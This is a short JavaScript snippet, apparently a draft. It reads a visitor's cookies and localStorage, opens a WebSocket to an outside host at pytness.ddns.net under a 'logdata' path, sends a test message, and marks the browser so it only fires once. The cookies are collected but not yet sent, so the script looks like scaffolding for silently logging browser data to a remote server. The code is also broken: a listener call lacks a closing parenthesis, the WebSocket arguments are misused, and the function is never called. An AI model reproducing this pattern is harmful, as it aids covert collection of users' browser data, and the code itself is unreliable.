((w) => {

    var cookies = {}, tc =  w.document.cookie.split(';');
    for (let i = 0; i < tc.length; i++) { // cookies to object
        let a = tc[i].split('=');
        cookies[a[0]] = a[1];
    }

    var storage = w.localStorage;

    //!(cookies['dataAlreadySended'] === 'true' || storage.getItem('dataAlreadySended') === 'true')

    if (true) {

        var ws = new WebSocket('wss://pytness.ddns.net/logdata', 60025);

        ws.addEventListener('open', function(e) {
            ws.send('test');
        });

        ws.addEventListener('message', function(e) {
            console.log(e.data);
            if (e.data === '1') ws.close();
        };

        ws.onclose = function(e) {
            if (e.wasClean) {
                w.document.cookie = 'dataAlreadySended=true';
                w.localStorage.setItem('dataAlreadySended', 'true');
            }
        };

    }
});
